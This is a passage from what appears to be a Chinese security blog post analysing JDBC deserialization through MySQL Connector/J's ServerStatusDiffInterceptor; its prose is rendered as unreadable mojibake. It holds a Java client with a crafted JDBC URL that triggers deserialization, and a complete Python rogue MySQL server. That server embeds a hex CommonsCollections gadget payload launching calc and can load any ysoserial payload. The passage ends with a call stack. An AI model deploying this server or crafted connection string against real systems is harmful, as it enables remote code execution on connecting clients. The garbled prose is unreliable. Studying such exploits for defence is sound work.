src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108125150644.png" class=""><p>å¯ä»¥æ‰¾åˆ°åœ¨å…¶åŒç±»ä¸‹çš„<code>preProcess</code>æ–¹æ³•è°ƒç”¨äº†å®ƒï¼Œåˆ°æ­¤ä¸ºæ­¢é“¾å­å°±ç®—å¯ä»¥é—­åˆäº†ã€‚ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Œæ˜¯å› ä¸ºmysqlåœ¨æ‰§è¡Œgetconectè¿›è¡Œè¿æ¥æ—¶ä¼šè°ƒç”¨ä¸€ç³»åˆ—çš„æ–¹æ³•è§¦å‘æˆ‘ä»¬æ‰‹åŠ¨é…ç½®çš„queryInterceptors(å¯ä»¥ç±»æ¯”äºä¸€ä¸ªæ‹¦æˆªæŸ¥è¯¢å™¨)ï¼Œå¦‚æœä¸ä¸ºç©ºçš„è¯å°±ä¼šè°ƒç”¨preProcessæ–¹æ³•ï¼Œæ¥ç€å°±ä¼šè°ƒç”¨populateMapWithSessionStatusValuesæ–¹æ³•å¹¶ä¸”æ‰§è¡Œä¸€ä¸ª<code>SHOW SESSION STATUS</code>sqlè¯­å¥ï¼Œå¹¶å°†è¿”å›çš„ç»“æœæ”¾å…¥<code>resultSetToMap</code>æ–¹æ³•ä¸­å†å»è°ƒç”¨<code>getobject</code>æ–¹æ³•ä»è€Œè§¦å‘æ¼æ´ã€‚</p><p>ä»…å‡­è¯­è¨€æè¿°è¿˜æ˜¯æ¯”è¾ƒæŠ½è±¡ï¼Œæ­å»ºä¸€ä¸ªæ¶æ„mysqlæœåŠ¡ç«¯ï¼Œæ¥è·Ÿè¿›ä¸€ä¸‹æ‰§è¡Œäº†<code>getConnection</code>æ–¹æ³•çš„æµç¨‹</p><h4 id="Mysqlå®¢æˆ·ç«¯"><a href="#Mysqlå®¢æˆ·ç«¯" class="headerlink" title="Mysqlå®¢æˆ·ç«¯"></a>Mysqlå®¢æˆ·ç«¯</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.sql.*;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jdbc8</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">driver</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">DB_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:59716/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_open -a Calculator&quot;</span>;<span class="comment">//8.xä½¿ç”¨  </span></span><br><span class="line">        Class.forName(driver);  </span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(DB_URL);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="MysqlæœåŠ¡ç«¯"><a href="#MysqlæœåŠ¡ç«¯" class="headerlink" title="MysqlæœåŠ¡ç«¯"></a>MysqlæœåŠ¡ç«¯</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">response_ok_data=<span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    <span class="comment">#fileæ–‡ä»¶çš„å†…å®¹ä½¿ç”¨ysoserialç”Ÿæˆçš„ ä½¿ç”¨è§„åˆ™ï¼šjava -jar ysoserial [Gadget] [command] &amp;gt; payload</span></span><br><span class="line">    file= <span class="string">r&#x27;payload&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = <span class="built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸»è¦é€»è¾‘</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.å…ˆå‘é€ç¬¬ä¸€ä¸ª é—®å€™æŠ¥æ–‡</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># ç™»å½•è®¤è¯è¿‡ç¨‹æ¨¡æ‹Ÿ  1.å®¢æˆ·ç«¯å‘é€request loginæŠ¥æ–‡ 2.æœåŠ¡ç«¯å“åº”response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#å…¶ä»–è¿‡ç¨‹</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#æŸ¥è¯¢ä¸€äº›é…ç½®ä¿¡æ¯,å…¶ä¸­ä¼šå‘é€è‡ªå·±çš„ ç‰ˆæœ¬å·</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload=<span class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                <span class="comment"># ä¸ºä»€ä¹ˆæˆ‘åŠ äº†EOF Packet å°±æ— æ³•æ­£å¸¸è¿è¡Œå‘¢ï¼Ÿï¼Ÿ</span></span><br><span class="line">                <span class="comment"># è·å–payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                <span class="comment"># è®¡ç®—payloadé•¿åº¦</span></span><br><span class="line">                payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># è®¡ç®—æ•°æ®åŒ…é•¿åº¦</span></span><br><span class="line">                data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">                mysql_data += <span class="built_in">str</span>(payload_content)</span><br><span class="line">                mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST =<span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    PORT = <span class="number">3307</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#å½“socketå…³é—­åï¼Œæœ¬åœ°ç«¯ç”¨äºè¯¥socketçš„ç«¯å£å·ç«‹åˆ»å°±å¯ä»¥è¢«é‡ç”¨.ä¸ºäº†å®éªŒçš„æ—¶å€™ä¸ç”¨ç­‰å¾…å¾ˆé•¿æ—¶é—´</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥é‡‡ç”¨å¦‚ä¸‹é¡¹ç›®<br><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a><br><a href="https://github.com/4ra1n/mysql-fake-server">https://github.com/4ra1n/mysql-fake-server</a></p><p>æˆ‘è¿™é‡Œé‡‡ç”¨çš„æ˜¯4ra1nå¸ˆå‚…çš„é¡¹ç›®å¤ç°çš„</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108133636013.png" class=""><p>å¯ä»¥æˆåŠŸå¤ç°ã€‚ä¸‹é¢å°±æ¥çœ‹çœ‹æµç¨‹</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108134010623.png" class=""><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œåˆè°ƒç”¨äº†<code>getConnection</code>ç»§ç»­è·Ÿè¿›å»çœ‹çœ‹</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108134035846.png" class=""><p>è°ƒç”¨äº†<code>connect</code>æ–¹æ³•</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108134123968.png" class=""><p>å‚æ•°æ²¡ä»€ä¹ˆå˜åŒ–ï¼Œä¼šè¿›å…¥åˆ°ç¬¬ä¸€ä¸ªcaseé‡Œï¼Œç„¶åè°ƒç”¨<code>getInstance</code>æ–¹æ³•</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108134218595.png" class=""><p>è¿”å›ä¸€ä¸ª<code>ConnectionImpl</code>æ–¹æ³•è·Ÿè¿›å»</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108134303411.png" class=""><p>è¿™é‡Œå°±æ˜¯ä¸€äº› evil mysqlçš„ä¸€äº›å‚æ•°</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108134447253.png" class=""><p>ä¸‹é¢ä¼šè°ƒç”¨ä¸€ä¸ª<code>initializeSafeQueryInterceptors</code>æ–¹æ³•ï¼Œè·Ÿè¿›å»</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108134639547.png" class=""><p>è¿™é‡Œå°±æ˜¯ä¸€äº›åˆå§‹åŒ–çš„æ“ä½œï¼Œç»§ç»­è·Ÿä¸‹å»ï¼Œè·Ÿè¿›<code>createNewIO</code>æ–¹æ³•</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108134705072.png" class=""><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108134803955.png" class=""><p>ä¼šè°ƒç”¨<code>connectOneTryOnly</code>æ–¹æ³•å¹¶ä¸”å‚æ•°æ˜¯falseï¼Œè·Ÿè¿›å»</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108135001000.png" class=""><p>ç»§ç»­åˆå§‹åŒ–</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108135029265.png" class=""><p>è°ƒç”¨äº†<code>handleAutoCommitDefaults</code>æ–¹æ³•è·Ÿè¿›å»</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108135151406.png" class=""><p>è°ƒç”¨<code>setAutoCommit</code>è®¾ç½®ä¸ºTrue</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108135253426.png" class=""><p>æ‰§è¡Œsqlè¯­å¥è·Ÿè¿›</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108135432198.png" class=""><p>è¿™é‡Œä¼šå‘æœåŠ¡ç«¯å‘é€æ•°æ®åŒ…ï¼Œè·Ÿè¿›<code>sendQueryString</code>æ–¹æ³•</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108135651368.png" class=""><p>æœ€åè¿”å›<code>sendQueryPacket</code>æ–¹æ³•è·Ÿè¿›</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108135720255.png" class=""><p>ä¼šè°ƒç”¨<code>invokeQueryInterceptorsPre</code>æ–¹æ³•</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108135752848.png" class=""><p>è¿™é‡Œæœ‰ç†Ÿæ‚‰çš„preProcessæ–¹æ³•äº†ï¼Œç»§ç»­è·Ÿè¿›</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108135816047.png" class=""><p>ç»§ç»­è°ƒç”¨</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108135828355.png" class=""><p>å¯ä»¥çœ‹åˆ°ç†Ÿæ‚‰çš„ä¸œè¥¿äº†ï¼Œè·Ÿè¿›å»</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108140034270.png" class=""><p>ä¸Šé¢çš„sqlè¯­å¥æŸ¥è¯¢æ¶æ„çš„æœåŠ¡ç«¯ä¼šè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œç„¶åè°ƒç”¨<code>resultSetToMap</code>æ–¹æ³•åœ¨è°ƒç”¨getObjectæ–¹æ³•å®ç°ååºåˆ—åŒ–ã€‚</p><p>åˆ—ä¸€ä¸‹è°ƒç”¨æ ˆ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">transform:<span class="number">123</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">158</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:<span class="number">74</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:<span class="number">121</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readObject:<span class="number">334</span>, HashSet (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">getObject:<span class="number">1326</span>, ResultSetImpl (com.mysql.cj.jdbc.result)</span><br><span class="line">resultSetToMap:<span class="number">46</span>, ResultSetUtil (com.mysql.cj.jdbc.util)</span><br><span class="line">populateMapWithSessionStatusValues:<span class="number">87</span>, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)</span><br><span class="line">preProcess:<span class="number">105</span>, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)</span><br><span class="line">preProcess:<span class="number">76</span>, NoSubInterceptorWrapper (com.mysql.cj)</span><br><span class="line">invokeQueryInterceptorsPre:<span class="number">1137</span>, NativeProtocol 